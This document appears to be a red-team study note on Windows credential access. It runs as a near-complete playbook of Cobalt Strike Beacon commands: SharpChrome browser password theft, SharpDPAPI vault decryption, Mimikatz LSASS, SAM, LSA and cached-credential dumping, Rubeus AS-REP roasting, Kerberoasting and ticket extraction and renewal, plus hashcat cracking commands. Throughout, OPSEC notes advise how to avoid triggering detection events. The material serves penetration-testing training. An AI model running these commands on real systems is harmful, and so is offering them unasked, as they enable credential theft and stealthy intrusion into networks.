_Credential Access_ is a tactic where an adversary attempts to steal the authentication material of users.
## Credentials from Web Browsers
Most Chromium-based browsers keep a SQLite database in the path `%LOCALAPPDATA%\<vendor>\<browser>\User Data\Default\Login Data`

Tools like SharpChrome can automatically read and decrypt credentials from the database.

NOTE: can be used from medium-integrity context.

```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

## Windows Credential Manager
The Windows Credential Manager stores other credentials that the user has asked Windows to save, such as those for Remote Desktop connections

`valutcmd` and Seatbelt's `WindowsVault` will show the presence of saved creds.

NOTE: This technique can be used from a medium-integrity context.

```powershell
# Identify PRESENCE of saved creds BAD OPSEC
beacon> run vaultcmd /listcreds:"Windows Credentials" /all  # vaultcmd way

or

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault # WindowsVault way

# Decrypt
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```

## OS Credential Dumping
The Local Security Authority Subsystem Service (LSASS) on Windows is responsible for  verifying the credentials of users when logging in, handling password changes, creating access tokens, and so on.

Microsoft provides something called the Security Support Provider Interface (SSPI), which is their implementation of the Generic Security Service API (GSSAPI).   SSPs are used to provide different authentication mechanisms for Windows, including:
	- _NTLM_ for authentication via NTLM and NTLMv2.
	- _Kerberos_ for authentication via Kerberos v5. 
	- _Digest_ for Lightweight Directory Access Protocol (LDAP) and web authentication.
	- _Schannel_ for authentication via public key cryptography, such as TLS and SSL.
	- Credential Security Service Provider (_CredSSP_) for single sign-on with Terminal Services and Remote Desktop sessions.

OPSEC NOTE: Dumping credentials from LSASS is generally a bad idea from an OPSEC perspective. 

Mimikatz Usage
```powershell
## DNS Beacons are SLOW... try spawning a HTTP beacon first
beacon> spawn x64 http

# Usage
beacon> mimikatz [command]
	# Prepend options to use before commands (ie: mimikatz !lsadump::sam)
	!  # prepend to elevate to SYSTEM prior to mimikatz
	@  # make mimikatz impersonate Beacon's thread before running command

# Commands
sekurlsa::logonpasswords   # NTLM Hash
sekurlsa::ekeys            # Kerberos Keys
sekurlsa::credman          # Windows Credential Manager
!lsadump::sam              # SAM (Security Account Manager)
!lsadump::secrets          # LSA (Local Security Authority) secrets
!lsadump::cache            # Cached Domain Credentials
```
Notes:
	NTLM Cracking example
		`.\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule`
	Cracking AES256 (kerberos) example
		required hash format - `$krb5db$18$<username>$<DOMAIN-FQDN>$<hash>`
		`.\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule`
	SAM
		dumps from `HKLK\sam` and `HKLM\system`
	LSA Secrets
		some stuff: service account passwords, machine domain account password, EFS encryption keys
		secrets pulled from memory or `HKLM/Security/Policy/Secrets`
		key stored in `HKLM/Security/Policy`
	Cached Domain Creds
		Windows computers that have been joined to a domain often cache domain logon information after a user has logged in.
		The credentials themselves are stored in a hashed format called MS-Cache v2. Must be extracted. cannot pass the hash.
		HOW TO CRACK?
			make note of ITERATIONS - for hash format, see [[Cracking]]
			`.\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule`

## Kerberos Tickets
See [[12 Kerberos]] or AD Attacks and for more in depth understanding of protocol and abuse.
#### AS-REP Roasting
OPSEC NOTE:
	Most detection strategies are geared towards looking at unusual or anomalous ticket requests.  Each AS-REP generates a 4768 event. Rubeus also requests RC4-encrypted tickets by default because they are easier to crack.  However, since modern versions of Windows uses AES128 and 256, the use of RC4 tickets can stand out.

Rubeus' `asreproast` command will enumerate every account that has preauthentication disabled

AS-REP roasting with Beacon
```powershell
# Triage targets first
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,distinguishedname --json

# AS-REP roasting specific user (good opsec)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /user:<samaccountname> /nowrap  # format, if not specified, is JtR

# AS-REP roasting ALL USERS (bad opsec)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap  # format, if not specified, is JtR

# Cracking (RC4)
.\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule  
```
#### Kerberoasting
OPSEC NOTE:
	Each TGS-REP generates a 4769 event, so a single user requesting multiple tickets in a short timeframe should be investigated.  As with AS-REP Roasting, Rubeus requests service tickets using RC4 encryption by default.

OPSEC NOTE 2 (IMPORTANT):
	A safer approach to Kerberoasting is to use an enumeration tool to triage potential targets first, then roast them more selectively.
	A defense strategy is to create one or more dummy SPNs that are not backed by a legitimate service, in which case, a TGS-REQ/REP should never be generated for them. If we flag this, OOPSY.

Rubeus' `kerberoast` command will enumerate and roast every non-default service. Targeted is possible, just check out [[Methodology/Active Directory/Kerberoasting|Kerberoasting]] and adapt accordingly.

Kerberoasting with Beacon
```powershell
# Triage targets first
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname --json

# Targeted Kerberoast (GOOD OPSEC)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:<SPN> /simple /nowrap

# Kerberoasting all services (BAD OPSEC)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple  # format, if not specified, is JtR

# Cracking
.\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
```

#### Extracting Tickets
If an adversary gains elevated access to a computer, they can extract Kerberos tickets that are currently cached in memory.  Rubeus' `triage` command will enumerate every logon session present and their associated tickets.

If multiple logon session exist (i.e. multiple users are logged onto the same computer), TGTs and/or service tickets for those users can be extracted and re-used by the adversary.

NOTE: Requires high-integrity session

OPSEC NOTE:
	The major OPSEC advantage of dumping tickets from memory is that it does not touch LSASS in the same way that dumping hashes does (e.g. with Mimikatz sekurlsa).

Ticket Extraction
```powershell
# Enumerate logon sessions and associated tickets
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# Extract tickets
beacon> execute-assembly C:\path\Rubeus.exe dump /nowrap  # extract ALL tickets
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<luid> /service:<svc (krbtgt, ldap, etc)> /nowrap # extract specific tickets
```

#### Renewing TGTs
Once a TGT has expired, it can no longer be used to request service tickets.  Running Rubeus `describe` against a ticket will show you its **StartTime**, **EndTime**, and **RenewTill** fields.

```powershell
# Checking ticket lifetime
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N # Run from Attacker box

# Renew ticket manually
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap
```
Note: _RenewTill_ is the date after which tickets cannot be renewed
	After renewing a ticket, RenewTill remains the same, but Start and EndTime change